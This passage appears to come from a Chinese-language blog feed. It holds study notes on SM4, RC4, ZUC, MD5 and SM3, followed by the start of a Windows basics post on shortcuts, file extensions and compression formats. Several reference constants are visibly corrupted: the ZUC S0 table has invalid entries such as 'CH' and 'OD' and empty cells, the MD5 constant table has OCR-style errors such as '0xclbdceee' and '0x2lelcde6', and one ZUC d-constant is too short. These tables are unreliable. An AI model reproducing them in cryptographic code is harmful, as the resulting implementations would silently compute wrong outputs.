class="number">0x181f262d</span>, <span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h4><p>解密过程如下：输入密文$(X_{35},X_{34},X_{33},X_{32})$，倒序输入轮密钥，最后需要反转一下在合并</p><p>$X_{i}=X_{i+4}\oplus T(X_{i+3}\oplus X_{i+2}\oplus X_{i+1}\oplus rk_{i})$</p><hr><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>属于流/序列密码，密钥长度可变（可以给任意位），面向字节操作，依赖于足够大的数据表对表进行非线性变换，来产生非线性的密钥序列</p><p>加密过程主要包括初始化S表与生成密钥流</p><h4 id="初始化S表"><a href="#初始化S表" class="headerlink" title="初始化S表"></a>初始化S表</h4><ol><li><p>对S表进行线性填充，即$S_{0}=0,S_{1}=1…$，一般为256字节</p></li><li><p>再用种子密钥循环填充另一个256字节的R表</p></li><li><p>利用R表的内容，对S表进行重新排序，规律如下：</p><p>$j=(j+S[i]+R[i])\bmod 256$，之后交换S[j]和S[i]的位置即可</p></li></ol><h4 id="密钥流生成"><a href="#密钥流生成" class="headerlink" title="密钥流生成"></a>密钥流生成</h4><p>生成一个与明文长度一样的密钥，用来对每一位进行异或。过程如下：</p><p>循环明文长度r（byte）次：$i=(i+1)\bmod 256; j=(j+S[i])\bmod 256$，之后将S[i]和S[j]进行交换，再相加并$\bmod 256$得到t，$K[r]=S[t]$，得到的K数组即密钥流</p><hr><h3 id="祖冲之ZUC"><a href="#祖冲之ZUC" class="headerlink" title="祖冲之ZUC"></a>祖冲之ZUC</h3><p>这里祖冲之算法得到的并非是我们常说的密文，得到的是流密码中的密钥，之后还需要与处理过的明文进行异或。参考<a href="https://www.bilibili.com/video/BV1xG4y1v7pK/?spm_id_from=333.337.search-card.all.click&amp;vd_source=a14ed599179f7f184401f3073d4efefa">【以ZUC算法为例介绍学习方法】| 祖冲之序列密码算法| 序列密码| 加密算法| 密码学| |国密| 学习方法_哔哩哔哩_bilibili</a></p><p>主要由线性反馈移位寄存器(LFSR)、比特重组(BR)、非线性函数F三大部分组成</p><h4 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h4><p>包括16个31bit的寄存器单元记为$S_{i}$，有初始化模式和工作模式两种，前者需要31bit的输入u后者不用</p><p><strong>初始化模式</strong>：</p><ol><li><p>$v=2^{15}S_{15}+2^{17}S_{13}+2^{21}S_{10}+2^{20}S_{4}+(2^{8}+1)S_{0}\bmod(2^{31}-1)$</p></li><li><p>$S_{16}=(v+u)\bmod(2^{31}-1)$</p></li><li><p>if $S_{16}=0$ then $S_{16}=2^{31}-1$</p></li><li><p>$(S_{1},S_{2}…S_{16})$变为$(S_{0}…S_{15})$</p></li></ol><p><strong>工作模式</strong>：相比于初始化模式，只需要去掉第二步即可</p><h4 id="BR"><a href="#BR" class="headerlink" title="BR"></a>BR</h4><p>输入LSFR的16个寄存器，并按照以下规则抽取128bit来组成4个32bit字</p><p>$X_{0}=S_{15H}||S_{14L}——;<br>X_{1}=S_{11L}||S_{9H}——;<br>X_{2}=S_{7L}||S_{5H}——;<br>X_{3}=S_{2L}||S_{0H}$</p><h4 id="F函数"><a href="#F函数" class="headerlink" title="F函数"></a>F函数</h4><p>以前面X0、X1、X2作为输入的函数，会输出一个32bit的字W，将W与X3异或的到输出密钥序列。过程如下：（S函数即S盒，有两个；L函数）</p><ol><li>$W=[(X_{0}\oplus R_{1})+R_{2}]\bmod 2^{32}$</li><li>$W_{1}=(R_{1}+X_{1})\bmod 2^{32}$</li><li>$W_{2}=R_{2}\oplus X_{2}$</li><li>$R_{1}=S[L_{1}(W_{1L}||W_{2H})]$</li><li>$R_{2}=S[L_{2}(W_{1H}||W_{2L})]$</li></ol><p><strong>L线性变换函数</strong>：</p><ul><li>$L_{1}=X\oplus (X&lt;&lt;&lt;2)\oplus (X&lt;&lt;&lt;10)\oplus (X&lt;&lt;&lt;18)\oplus (X&lt;&lt;&lt;24)$</li><li>$L_{2}=X\oplus (X&lt;&lt;&lt;8)\oplus (X&lt;&lt;&lt;14)\oplus (X&lt;&lt;&lt;22)\oplus (X&lt;&lt;&lt;30)$</li></ul><p><strong>S盒</strong>：包括四个8×8的盒子$(S_{0},S_{1},S_{0},S_{1})$，将输入S盒的32位进行8bit分组，每组分别进入到上述盒子中进行置换，高四位做行，第四位做列；</p><div class="table-container"><table><thead><tr><th>S0</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>a</th><th>b</th><th>c</th><th>d</th><th>e</th><th>f</th></tr></thead><tbody><tr><td><strong>0</strong></td><td>3E</td><td>72</td><td>5B</td><td>47</td><td>CA</td><td>E0</td><td>00</td><td>33</td><td>04</td><td>D1</td><td>54</td><td>98</td><td>09</td><td>B9</td><td>6D</td><td>CB</td></tr><tr><td><strong>1</strong></td><td>7B</td><td>1B</td><td>F9</td><td>32</td><td>AF</td><td>9D</td><td>6A</td><td>A5</td><td>B8</td><td>2D</td><td>FC</td><td>1D</td><td>08</td><td>53</td><td>03</td><td>90</td></tr><tr><td><strong>2</strong></td><td>4D</td><td>4E</td><td>84</td><td>99</td><td>E4</td><td>CE</td><td>D9</td><td>91</td><td>DD</td><td>B6</td><td>85</td><td>48</td><td>8B</td><td>29</td><td>6E</td><td>AC</td></tr><tr><td><strong>3</strong></td><td>CD</td><td>F8</td><td>1E</td><td>73</td><td>43</td><td>69</td><td>C6</td><td>B5</td><td>BD</td><td>FD</td><td>39</td><td>63</td><td>20</td><td>D4</td><td>38</td><td></td></tr><tr><td><strong>4</strong></td><td>76</td><td>7D</td><td>B2</td><td>A7</td><td>CH</td><td>ED</td><td>57</td><td>C5</td><td>F3</td><td>BB</td><td>14</td><td>21</td><td>06</td><td>55</td><td>9B</td><td></td></tr><tr><td><strong>5</strong></td><td>E3</td><td>EF</td><td>5E</td><td>31</td><td>4F</td><td>7F</td><td>5A</td><td>A4</td><td>OD</td><td>82</td><td>51</td><td>49</td><td>5F</td><td>BA</td><td>58</td><td>1C</td></tr><tr><td><strong>6</strong></td><td>4A</td><td>16</td><td>D5</td><td>17</td><td>A8</td><td>92</td><td>24</td><td>1F</td><td>8C</td><td>D8</td><td>AE</td><td>2E</td><td>01</td><td>D3</td><td>AD</td><td></td></tr><tr><td><strong>7</strong></td><td>3B</td><td>4B</td><td>DA</td><td>46</td><td>EB</td><td>C9</td><td>DE</td><td>9A</td><td>8F</td><td>87</td><td>D7</td><td>3A</td><td>80</td><td>6F</td><td>2F</td><td>C8</td></tr><tr><td><strong>8</strong></td><td>B1</td><td>B4</td><td>37</td><td>F7</td><td>22</td><td>13</td><td>28</td><td>7C</td><td>CC</td><td>3C</td><td>89</td><td>C7</td><td>C3</td><td>96</td><td>56</td><td></td></tr><tr><td><strong>9</strong></td><td>07</td><td>BF</td><td>7E</td><td>F0</td><td>0B</td><td>2B</td><td>97</td><td>52</td><td>35</td><td>41</td><td>79</td><td>61</td><td>A6</td><td>4C</td><td>10</td><td>FE</td></tr><tr><td><strong>a</strong></td><td>BC</td><td>26</td><td>95</td><td>88</td><td>8A</td><td>B0</td><td>A3</td><td>FB</td><td>C0</td><td>18</td><td>94</td><td>F2</td><td>E1</td><td>E5</td><td>E9</td><td>5D</td></tr><tr><td><strong>b</strong></td><td>D0</td><td>DC</td><td>11</td><td>66</td><td>64</td><td>50</td><td>EC</td><td>59</td><td>42</td><td>75</td><td>12</td><td>F5</td><td>74</td><td>9C</td><td>AA</td><td>23</td></tr><tr><td><strong>c</strong></td><td>0E</td><td>86</td><td>AB</td><td>BE</td><td>2A</td><td>02</td><td>E7</td><td>67</td><td>E6</td><td>44</td><td>A2</td><td>6C</td><td>C2</td><td>93</td><td>9F</td><td>F1</td></tr><tr><td><strong>d</strong></td><td>F6</td><td>FA</td><td>36</td><td>D2</td><td>50</td><td>68</td><td>9E</td><td>62</td><td>71</td><td>15</td><td>3D</td><td>D6</td><td>40</td><td>C4</td><td>E2</td><td>0F</td></tr><tr><td><strong>e</strong></td><td>8E</td><td>83</td><td>77</td><td>6B</td><td>25</td><td>05</td><td>3F</td><td>30</td><td>EA</td><td>70</td><td>B7</td><td>A1</td><td>E8</td><td>A9</td><td>65</td><td></td></tr><tr><td><strong>f</strong></td><td>8D</td><td>27</td><td>1A</td><td>DB</td><td>81</td><td>B3</td><td>A0</td><td>F4</td><td>45</td><td>7A</td><td>19</td><td>DF</td><td>EE</td><td>78</td><td>34</td><td>60</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>S1</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>a</th><th>b</th><th>c</th><th>d</th><th>e</th><th>f</th></tr></thead><tbody><tr><td><strong>0</strong></td><td>55</td><td>C2</td><td>63</td><td>71</td><td>3B</td><td>C8</td><td>47</td><td>86</td><td>9F</td><td>3C</td><td>DA</td><td>5B</td><td>29</td><td>AA</td><td>FD</td><td>77</td></tr><tr><td><strong>1</strong></td><td>8C</td><td>C5</td><td>94</td><td>0C</td><td>A6</td><td>1A</td><td>13</td><td>00</td><td>E3</td><td>A8</td><td>16</td><td>72</td><td>40</td><td>F9</td><td>F8</td><td>42</td></tr><tr><td><strong>2</strong></td><td>44</td><td>26</td><td>68</td><td>96</td><td>81</td><td>D9</td><td>45</td><td>3E</td><td>10</td><td>76</td><td>C6</td><td>A7</td><td>8B</td><td>39</td><td>43</td><td>E1</td></tr><tr><td><strong>3</strong></td><td>3A</td><td>B5</td><td>56</td><td>2A</td><td>C0</td><td>6D</td><td>B3</td><td>05</td><td>22</td><td>66</td><td>BF</td><td>DC</td><td>0B</td><td>FA</td><td>62</td><td>48</td></tr><tr><td><strong>4</strong></td><td>DD</td><td>20</td><td>11</td><td>06</td><td>36</td><td>C9</td><td>C1</td><td>CF</td><td>F6</td><td>27</td><td>52</td><td>BB</td><td>69</td><td>F5</td><td>D4</td><td>87</td></tr><tr><td><strong>5</strong></td><td>7F</td><td>84</td><td>4C</td><td>D2</td><td>9C</td><td>57</td><td>A4</td><td>BC</td><td>4F</td><td>9A</td><td>DF</td><td>FE</td><td>D6</td><td>8D</td><td>7A</td><td>EB</td></tr><tr><td><strong>6</strong></td><td>2B</td><td>53</td><td>D8</td><td>5C</td><td>A1</td><td>14</td><td>17</td><td>FB</td><td>23</td><td>D5</td><td>7D</td><td>30</td><td>67</td><td>73</td><td>08</td><td>09</td></tr><tr><td><strong>7</strong></td><td>EE</td><td>B7</td><td>70</td><td>3F</td><td>61</td><td>B2</td><td>19</td><td>8E</td><td>4E</td><td>E5</td><td>4B</td><td>93</td><td>8F</td><td>5D</td><td>DB</td><td>A9</td></tr><tr><td><strong>8</strong></td><td>AD</td><td>F1</td><td>AE</td><td>2E</td><td>CB</td><td>0D</td><td>FC</td><td>F4</td><td>2D</td><td>46</td><td>6E</td><td>1D</td><td>97</td><td>E8</td><td>D1</td><td>E9</td></tr><tr><td><strong>9</strong></td><td>4D</td><td>37</td><td>A5</td><td>75</td><td>5E</td><td>83</td><td>9E</td><td>AB</td><td>82</td><td>9D</td><td>B9</td><td>1C</td><td>E0</td><td>CD</td><td>49</td><td>89</td></tr><tr><td><strong>a</strong></td><td>01</td><td>B6</td><td>BD</td><td>58</td><td>24</td><td>A2</td><td>5F</td><td>38</td><td>78</td><td>99</td><td>15</td><td>90</td><td>50</td><td>B8</td><td>95</td><td>E4</td></tr><tr><td><strong>b</strong></td><td>D0</td><td>91</td><td>C7</td><td>CE</td><td>ED</td><td>0F</td><td>B4</td><td>6F</td><td>A0</td><td>CC</td><td>F0</td><td>02</td><td>4A</td><td>79</td><td>C3</td><td>DE</td></tr><tr><td><strong>c</strong></td><td>A3</td><td>EF</td><td>EA</td><td>51</td><td>E6</td><td>6B</td><td>18</td><td>EC</td><td>1B</td><td>2C</td><td>80</td><td>F7</td><td>74</td><td>E7</td><td>FF</td><td>21</td></tr><tr><td><strong>d</strong></td><td>5A</td><td>6A</td><td>54</td><td>1E</td><td>41</td><td>31</td><td>92</td><td>35</td><td>C4</td><td>33</td><td>07</td><td>0A</td><td>BA</td><td>7E</td><td>0E</td><td>34</td></tr><tr><td><strong>e</strong></td><td>88</td><td>B1</td><td>98</td><td>7C</td><td>F3</td><td>3D</td><td>60</td><td>6C</td><td>7B</td><td>CA</td><td>D3</td><td>1F</td><td>32</td><td>65</td><td>04</td><td>28</td></tr><tr><td><strong>f</strong></td><td>64</td><td>BE</td><td>85</td><td>9B</td><td>2F</td><td>59</td><td>8A</td><td>D7</td><td>B0</td><td>25</td><td>AC</td><td>AF</td><td>12</td><td>03</td><td>E2</td><td>F2</td></tr></tbody></table></div><h4 id="密钥装入"><a href="#密钥装入" class="headerlink" title="密钥装入"></a>密钥装入</h4><p>用来给S0-S15进行赋值，$S_{i}=k_{i}拼d_{i}拼iv_{i}$；8+8+15=31bit</p><p>KEY为128bit的初始密码，分成16组；IV为128bit的初始化向量，同理</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">d0=<span class="number">100010011010111</span></span><br><span class="line">d1=<span class="number">010011010111100</span></span><br><span class="line">d2=<span class="number">110001001101011</span></span><br><span class="line">d3=<span class="number">001001101011110</span></span><br><span class="line">d4=<span class="number">101011110001001</span></span><br><span class="line">d5=<span class="number">011010111100010</span></span><br><span class="line">d6=<span class="number">111000100110101</span></span><br><span class="line">d7=<span class="number">000100110101111</span></span><br><span class="line">d8=<span class="number">100110101111000</span></span><br><span class="line">d9=<span class="number">010111100010011</span></span><br><span class="line">d10=<span class="number">110101111000100</span></span><br><span class="line">d11=<span class="number">001101011110001</span></span><br><span class="line">d12=<span class="number">101111000100110</span></span><br><span class="line">d13=<span class="number">01111001001101</span></span><br><span class="line">d14=<span class="number">111100010011010</span></span><br><span class="line">d15=<span class="number">100011110101100</span></span><br></pre></td></tr></table></figure><h4 id="算法运行"><a href="#算法运行" class="headerlink" title="算法运行"></a>算法运行</h4><p>初始化阶段：</p><ol><li>输入初始化密钥KEY和初始向量IV，并进行密钥装入，并将F函数中的R0和R1全部先置为0</li><li>依序重复执行32次：比特重组、F函数、LFSR初始化模式（其中的u是F函数输出的32位W去掉最低位得到的）</li><li>再执行一次：比特重组、F函数（输出的W不要）、LFSR工作模式</li><li>再：比特重组、F函数的W与X3异或得到密钥Z、LFSR工作模式</li></ol><hr><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>特性：压缩性、易计算、抗修改、碰撞难度大。目前已经不安全<a href="https://www.cmd5.com/">md5在线解密</a>、<a href="https://www.somd5.com/">SOMD5</a>。算法参考<a href="https://www.bilibili.com/video/BV1aP411M7ug/?spm_id_from=333.337.search-card.all.click&amp;vd_source=a14ed599179f7f184401f3073d4efefa">MD5算法详解_哔哩哔哩_bilibili</a></p><h4 id="预填充处理"><a href="#预填充处理" class="headerlink" title="预填充处理"></a>预填充处理</h4><ol><li>将任意长度的明文进行扩展（后面紧跟一个1，之后以0填充），使其在mod 512之后能够剩余448bit</li><li>再在后面添加一个64位的、填充信息前的、明文长度，如果长度超过64位则取低64位</li><li>引入链接变量<code>A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476</code>（可在程序中写的数，不涉及底层大小端存储，便于理解）</li></ol><h4 id="分组处理"><a href="#分组处理" class="headerlink" title="分组处理"></a>分组处理</h4><p>将处理后的明文按512bit分组，每组拿上面的128bit的数参与运算，得到128bit的结果，并接着输入。大循环4轮（4种操作），每轮下面又有16次运算（1种操作的16种不同参数）。下面是其中的关键运算函数</p><p><strong>4个非线性函数</strong>：被用于4种操作</p><ul><li>$F(X,Y,Z)=(X\&amp;Y)|((~X)\&amp;Z);$</li><li>$G(X,Y,Z)=(X\&amp;Z)|(Y\&amp;(~Z));$</li><li>$H(X,Y,Z)=X \wedge Y \wedge Z;$</li><li>$I(X,Y,Z)=Y \wedge (X|(~Z));$</li></ul><p><strong>4种操作</strong>：(&lt;&lt;&lt;循环左移)</p><ul><li>$FF(a,b,c,d,Mi,s,tj):a=b+((a+F(b,c,d)+M_{i}+t_{j})&lt;&lt;&lt;s)$</li><li>$GG(a,b,c,d,Mi,s,tj):a=b+((a+G(b,c,d)+M_{i}+t_{j})&lt;&lt;&lt;s)$</li><li>$HH(a,b,c,d,Mi,s,tj):a=b+((a+H(b,c,d)+M_{i}+t_{j}&lt;&lt;&lt;s)$</li><li>$II(a,b,c,d,Mi,s,tj):a=b+((a+I(b,c,d)+M_{i}+t_{j})&lt;&lt;&lt;s)$</li></ul><p>第一组运算时，将a=A,b=B,c=C,d=D进行赋值，在4×16次运算之后，A+=a,B+=b,C+=c,D+=d，并代入到下一组的计算…最后一组计算完成之后，将ABCD进行拼接，得到的16字节即为MD5结果</p><p><strong>$t_{j}$</strong>：$t_{j}=2^{32}*abs(sin(j)),j=1,2…64$，也可取如下常量表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t[<span class="number">64</span>]=&#123;</span><br><span class="line">    <span class="number">0xd76aa478</span>,<span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>,<span class="number">0xcl</span>bdceee, <span class="number">0xf57c</span>Ofaf, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span>,<span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>,<span class="number">0xffff5bb1</span>,<span class="number">0x895cd7be</span>, <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>,<span class="number">0xa679438e</span>, <span class="number">0x49b40821</span>, <span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span>, <span class="number">0xd62f105d</span>, <span class="number">0x02441453</span>,<span class="number">0xd8a1e681</span>, <span class="number">0x2l</span>elcde6, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455al</span>4ed, <span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span>, <span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>,<span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span>, <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>,<span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span>, <span class="number">0x289b7ec6</span>, <span class="number">0xeaal</span>27fa, <span class="number">0xd4ef3085</span>, <span class="number">0x04881d05</span>, <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0</span>xlfa27cf8, <span class="number">0xc4ac5665</span>, <span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>,<span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span>, <span class="number">0x655b59c3</span>,<span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>,<span class="number">0x85845dd1</span>, <span class="number">0x6fa87e4f</span>,<span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>,<span class="number">0x4e0811a1</span>, <span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>,<span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>$M_{i}$</strong>：将512bit的分组，按照4字节即32bit，再次分组，共16小组，i代表组，但是取出Mi值时，需要注意按照小端读取。</p><p><strong>S</strong>：固定位移表，如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">S[<span class="number">64</span>]=&#123;</span><br><span class="line"><span class="number">7</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">22</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">22</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">22</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">22</span>,</span><br><span class="line"><span class="number">5</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">20</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">20</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">20</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">20</span>,</span><br><span class="line"><span class="number">4</span>,<span class="number">11</span>,<span class="number">16</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">16</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">16</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">16</span>,<span class="number">23</span>,</span><br><span class="line"><span class="number">6</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">21</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">21</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">21</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">21</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="SM3"><a href="#SM3" class="headerlink" title="SM3"></a>SM3</h3><p>中国商用密码杂凑算法，多用于数字签名和验证，是一种消息摘要算法。基于SHA-256，安全性与其相当。官网参考<a href="http://c.gb688.cn/bzgk/gb/showGb?type=online&amp;hcno=45B1A67F20F3BF339211C391E9278F5E">GB/T 32905-2016 (gb688.cn)</a></p><p>大致过程：消息填充、消息扩展、迭代压缩</p><h4 id="消息填充"><a href="#消息填充" class="headerlink" title="消息填充"></a>消息填充</h4><p>以512位数据分组作为输入，填充规则与MD5相同，不多bb</p><h4 id="消息扩展"><a href="#消息扩展" class="headerlink" title="消息扩展"></a>消息扩展</h4><p>将16个字（64字节）的输入转换为132（68$W_{i}$+64$W’_{i}$）个字，隐藏了原消息位之间的关联。</p><p>步骤如下：</p><ol><li><p>消息分组再次分为16组（1组1字）：$W_{0}…W_{15}$</p></li><li><p>$W_{i}=P_{1}(W_{i-16}\oplus W_{i-9}\oplus (W_{i-3}&lt;&lt;&lt;15))\oplus (W_{i-13}&lt;&lt;&lt;7)\oplus W_{i-6}$；其中i=16-67</p><p>$P_{1}(X)=X\oplus (X&lt;&lt;&lt;15)\oplus (X&lt;&lt;&lt;23)$</p></li><li><p>$W’_{i}=W_{i}\oplus W_{i+4}$；其中i=0-63</p></li></ol><h4 id="迭代压缩"><a href="#迭代压缩" class="headerlink" title="迭代压缩"></a>迭代压缩</h4><p>$V^{i+1}=CF(V^{i},B^{i}),i=0…n-1$，其中B为扩展过的消息分组，V0是一个256bit的初始向量，得到的最后的$V^{n}$就是原消息的Hash值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V0=<span class="number">7380166</span>f <span class="number">4914</span>b2b9 <span class="number">172442</span>d7 da8a0600 a96130bc <span class="number">163138</span>aa e38dee4d b0fb<span class="number">0e4</span>e</span><br></pre></td></tr></table></figure><p><strong>CF压缩函数</strong>（core）：</p><p>共进行64轮，设置ABCDEFGH，共8个32bit字寄存器，用V0赋值，进入第一轮（SS1、SS2、TT1、TT2为中间变量），具体过程如下：（i为分组号，j为轮数）</p><ol><li><p>$SS1=((A&lt;&lt;&lt;12)+E+(T_{i}&lt;&lt;&lt;(j\bmod 32)))&lt;&lt;&lt;7$</p><blockquote><p>j&lt;=15时，Tj=79cc4519，j&gt;=16&amp;&amp;j&lt;=63时，Tj=7a879d8a</p></blockquote></li><li><p>$SS2=SS1\oplus (A&lt;&lt;&lt;12)$</p></li><li><p>$TT1=FF_{i}(A,B,C)+D+SS2+W’_{i}$</p><blockquote><p>$FF_{j}(X,Y,Z)\begin{cases}<br>  X\oplus Y\oplus Z;0\le j\le 15\\<br>  (X\wedge Y)\vee (X\wedge Z)\vee (Y\wedge Z);16\le j\le 63<br>\end{cases}$</p></blockquote></li><li><p>$TT2=GG_{i}(E,F,G)+H+SS1+W_{i}$</p><blockquote><p>$GG_{j}(X,Y,Z)\begin{cases}<br>  X\oplus Y\oplus Z;0\le j\le 15\\<br>  (X\wedge Y)\vee (\neg X\wedge Z);16\le j\le 63<br>\end{cases}$</p></blockquote></li><li><p>$D=C$；（5-12步为，ABCDEFGH的重赋值）</p></li><li><p>$C=B&lt;&lt;&lt;9$</p></li><li><p>$B=A$</p></li><li><p>$A=TT1$</p></li><li><p>$H=G$</p></li><li><p>$G=F&lt;&lt;&lt;19$</p></li><li><p>$F=E$</p></li><li><p>$E=P_{0}(TT2)$</p><blockquote><p>$P_{0}(X)=X\oplus (X&lt;&lt;&lt;9)\oplus (X&lt;&lt;&lt;17)$</p></blockquote></li></ol><p>在一组经过64轮计算之后，将Vn重新赋值给ABCDEFGH寄存器，得到的就是该分组的Hash</p>]]></content>
      
      
      <categories>
          
          <category> 密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows不完全讲解</title>
      <link href="/2023/09/07/Windows%E4%B8%8D%E5%AE%8C%E5%85%A8%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/09/07/Windows%E4%B8%8D%E5%AE%8C%E5%85%A8%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>Windows历史！！！！</p><ul><li><p>MS-DOS：微软魔改的86-DOS——Windows1.0：简单的对DOS的图形化包装——Windows2.0——Windows3.0：更改界面UI、添加图标等并且能够模拟32位处理器</p></li><li><p>支持32位处理器的Windows9x系列但仍有16位的代码：包括95、98、98E、Me等。出现了开始菜单和IE的捆绑销售</p></li><li><p>支持32位/64位处理器的Windows NT系列没有16位：new technology的意思，win2000——XP引入了家庭企业版——Vista——7基于Vista——8/8.1——WindowsPhone——10——11</p><blockquote><p>没有9？因为seven “ate” nine</p></blockquote></li></ul><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><div class="table-container"><table><thead><tr><th>快捷键</th><th>作用</th></tr></thead><tbody><tr><td>WIN+E、I、M、R、V、+/-</td><td>文件管理、设置、最小化(多个shift还原)、运行、剪切板、放大缩小</td></tr><tr><td>CTRL+Z、Y、shift+Esc、Shift+N</td><td>撤销、恢复、任务管理器、新建文件夹</td></tr><tr><td>alt+F4、Enter</td><td>关闭当前程序、查看文件属性</td></tr><tr><td>Shift+delete</td><td>永久删除，不在回收站</td></tr><tr><td>F11</td><td>全屏</td></tr></tbody></table></div><p><strong>文件扩展</strong>：仅仅用来告诉程序如何打开该文件，并不会对文件内容有啥破坏。在windows下扩展后缀用于指示如何打开该文件，而在linux下则是根据文件属性来判断的。</p><ol><li><p>.inf文件即驱动的说明文件；驱动，即硬件驱动程序，是使硬件正常工作的一种软件；.inf文件里存放着关于驱动的适配厂商，版本号等信息</p></li><li><p>.sys文件，系统级驱动程序文件的可执行代码</p></li><li><p>.dll，动态链接库；.lib静态链接库</p></li><li><p>.bin，二进制文件</p></li><li><p>.ini文件即初始化文件；是windows系统配置文件采用的存储格式；类似功能还有.cfg、.conf、.tx*</p><blockquote><p>.ini文件由若干节（[xxxx]中括号包围）构成，每节都由若干键-值构成（abb=xxxx），分号用于表示注释，直到行末；目前还存有少数.ini文件，大多都用注册表代替</p></blockquote></li></ol><p><strong>压缩技术</strong>：信息熵-符号出现次数越多，则信息越小h(x)=log2(1/p(x))</p><p>无损压缩与有损压缩（常用于视频图片等不容易被发现的）；哈夫曼编码，LZ77算法，LZ78算法</p><p>BMP：win平台上专用的位图，未经过压缩的原图；PNG：无损压缩比gif小，压缩算法LZ77；GIF：压缩算法LZW，包括动态GIF和静态GIF；JPG/JPEG：有损压缩，得到的图片最小；</p><p>MP3：压缩率1:10~12左右（lame编解码器）空间占用mp1&gt;mp2&gt;mp3；WMA：微软推出的与MP3类似，但是压缩率更高，音质更好；WAV：win下面的原声；APE：无损压缩，比率1:5？；FLAC：无损压缩，好；</p><div 